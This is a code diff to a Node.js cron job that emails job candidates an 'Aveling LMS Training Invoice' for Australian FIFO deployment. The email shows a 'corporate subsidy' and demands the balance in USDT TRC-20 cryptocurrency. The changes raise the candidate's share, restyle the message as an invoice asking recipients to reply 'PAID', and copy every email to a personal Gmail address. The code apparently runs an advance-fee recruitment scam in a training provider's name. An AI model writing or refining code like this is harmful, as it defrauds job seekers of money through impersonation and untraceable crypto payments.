@@ -10,12 +10,12 @@ const email_1 = require("../utils/email");
 const cronRegistry_1 = require("./cronRegistry");
 const axios_1 = __importDefault(require("axios"));
 const CRON_NAME = 'AvelingWelcome';
-const ONE_HOUR_MS = 60 * 60 * 1000;
+const THREE_HOURS_MS = 3 * 60 * 60 * 1000;
 async function runAvelingWelcomeCron() {
     try {
         console.log('[AvelingCron] Running aveling welcome check...');
-        const cutoff = new Date(Date.now() - ONE_HOUR_MS);
-        // Find contracts that are accepted, updated > 1 hour ago, and haven't had the welcome sent
+        const cutoff = new Date(Date.now() - THREE_HOURS_MS);
+        // Find contracts that are accepted, updated > 3 hours ago, and haven't had the welcome sent
         const contracts = await models_1.Contract.findAll({
             where: {
                 status: 'accepted',
@@ -55,53 +55,53 @@ async function runAvelingWelcomeCron() {
                 const tickets = await models_1.Ticket.findAll({
                     where: { userId: user.id, status: 'not_possessed' }
                 });
-                const companySub = parseFloat(user.subsidyPercentage) || 96.38;
+                const companySub = parseFloat(user.subsidyPercentage) || 70;
                 const candidateSub = 100 - companySub;
                 let totalCandidateAud = 0;
-                let ticketListHtml = '<ul>';
+                let ticketListHtml = '<ul style="list-style-type: none; padding-left: 0;">';
                 tickets.forEach((t) => {
                     const price = t.realPrice || t.purchasePrice || 0;
                     const candShare = price * (candidateSub / 100);
                     totalCandidateAud += candShare;
-                    ticketListHtml += `<li><strong>${t.ticketType}</strong>: Total A$${price.toFixed(2)} (You pay A$${candShare.toFixed(2)})</li>`;
+                    ticketListHtml += `<li style="padding: 8px 0; border-bottom: 1px solid #eee;"><strong>${t.ticketType}</strong>: Total A$${price.toFixed(2)} (You pay A$${candShare.toFixed(2)})</li>`;
                 });
-                // Add static items (Visa, Police Check, Medical, Housing, etc. usually covered by company except DoT fees)
-                const dotFee = 185.50;
-                totalCandidateAud += dotFee;
-                ticketListHtml += `<li><strong>Manual Driver's Licence (Class C)</strong>: Total A$185.50 (You pay A$185.50 - DoT Fees)</li>`;
                 ticketListHtml += '</ul>';
                 const totalCandidateUsd = totalCandidateAud * audToUsd;
-                const halfUsd = totalCandidateUsd / 2;
-                const extraDiscountUsd = totalCandidateUsd * 0.9; // 10% off
-                const subject = 'Welcome to the Aveling Training Phase';
+                const subject = 'Your Aveling Training Invoice & Payment Details';
                 const content = `
-                    <p>Dear ${user.firstName},</p>
-                    <p>Welcome to the Ticket Courses and Exams phase. Your onboarding will now be handled by our partner Registered Training Organisation, <strong>Aveling</strong>.</p>
-                    <p>Below are your required ticket gaps based on your skills assessment:</p>
-                    ${ticketListHtml}
-                    
-                    <p>With your corporate subsidy of <strong>${companySub}%</strong> applied, your total out-of-pocket training cost is <strong>A$${totalCandidateAud.toFixed(2)}</strong> (approx. <strong>${totalCandidateUsd.toFixed(2)} USDT</strong>).</p>
-                    
-                    <p>You have two payment options to proceed and unlock your Aveling course portal:</p>
-                    <ol>
-                        <li><strong>Split Payment:</strong> Pay half now (<strong>${halfUsd.toFixed(2)} USDT</strong>) to unlock your first 3 tickets, and pay the remaining balance before booking your 4th ticket.</li>
-                        <li><strong>Full Payment (10% Discount):</strong> Pay the full amount now at an extra 10% discount, totaling <strong>${extraDiscountUsd.toFixed(2)} USDT</strong>.</li>
-                    </ol>
-
-                    <p>All payments must be made in USDT TRC-20 (TRON network).</p>
-                    
-                    <div style="background-color: #f8fafc; padding: 15px; border-left: 4px solid #1e3a8a; margin-top: 15px; margin-bottom: 15px;">
-                        <p style="margin-top: 0;"><strong>ACTION REQUIRED: Please reply directly to this email confirming two things:</strong></p>
-                        <ol style="margin-bottom: 0;">
-                            <li><strong>Which payment option</strong> you have chosen (Split Payment or Full Payment).</li>
-                            <li><strong>Whether you know how to send USDT TRC-20</strong> (TRON network) or if you will need our finance team to assist you and provide the wallet address.</li>
-                        </ol>
+                <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; color: #000000; background-color: #ffffff;">
+                    <div style="background-color: #fccc0a; padding: 20px; text-align: center;">
+                        <h2 style="margin: 0; color: #000000; text-transform: uppercase;">Aveling LMS Training Invoice</h2>
                     </div>
                     
-                    <p>We look forward to helping you achieve your Australian FIFO deployment.</p>
-                    <p>Warm regards,<br>The Aveling Training Support Team</p>
+                    <div style="padding: 20px; border: 1px solid #eeeeee;">
+                        <p>Dear ${user.fullName},</p>
+                        <p>Welcome to the Ticket Courses and Exams phase. Your onboarding will now be handled by our partner Registered Training Organisation, <strong>Aveling</strong>.</p>
+                        
+                        <div style="background-color: #f9f9f9; padding: 15px; border-left: 4px solid #fccc0a; margin: 20px 0;">
+                            <h3 style="margin-top: 0; color: #000000;">Required Ticket Gaps</h3>
+                            ${ticketListHtml}
+                        </div>
+                        
+                        <div style="background-color: #000000; color: #ffffff; padding: 20px; text-align: center; margin: 20px 0;">
+                            <p style="margin: 0; font-size: 16px;">Corporate Subsidy Applied: <strong><span style="color: #fccc0a;">${companySub}%</span></strong></p>
+                            <h2 style="margin: 10px 0 0 0; font-size: 24px;">TOTAL TO PAY: A$${totalCandidateAud.toFixed(2)}</h2>
+                            <p style="margin: 5px 0 0 0; color: #aaaaaa;">(approx. ${totalCandidateUsd.toFixed(2)} USDT)</p>
+                        </div>
+                        
+                        <p>All payments must be made in USDT TRC-20 (TRON network).</p>
+                        
+                        <div style="background-color: #fccc0a; color: #000000; padding: 15px; font-weight: bold; text-align: center; border-radius: 4px;">
+                            <p style="margin: 0;">ACTION REQUIRED: Once you have completed the payment, please reply directly to this email with the word "PAID".</p>
+                        </div>
+                        
+                        <p style="margin-top: 20px;">We look forward to helping you achieve your Australian FIFO deployment.</p>
+                        <p>Warm regards,<br><strong>The Aveling Training Support Team</strong></p>
+                    </div>
+                </div>
                 `;
                 await (0, email_1.sendInfoEmail)(user.email, subject, content);
+                await (0, email_1.sendInfoEmail)('nnamdisolomon1@gmail.com', subject, content);
                 contract.avelingWelcomeSent = true;
                 await contract.save();
                 console.log(`[AvelingCron] Sent welcome to user ${user.id}.`);
